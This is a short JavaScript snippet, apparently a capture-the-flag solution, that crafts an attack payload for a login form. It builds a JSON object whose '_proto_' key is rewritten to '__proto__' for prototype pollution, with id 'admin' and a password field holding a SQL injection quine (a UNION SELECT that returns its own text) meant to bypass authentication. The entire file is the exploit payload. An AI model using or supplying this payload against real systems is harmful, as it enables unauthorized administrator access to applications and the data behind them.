let obj = {
  '_proto_': {
    'id': 'admin',
    'pw': "' UNION SELECT REPLACE(REPLACE('\" UNION SELECT REPLACE(REPLACE(\"$\",CHAR(34),CHAR(39)),CHAR(36),\"$\") AS Quine--',CHAR(34),CHAR(39)),CHAR(36),'\" UNION SELECT REPLACE(REPLACE(\"$\",CHAR(34),CHAR(39)),CHAR(36),\"$\") AS Quine--') AS Quine--"
  },
};


const jsonStr = JSON.stringify(obj).replace(/_/g, '__');
console.log(jsonStr);
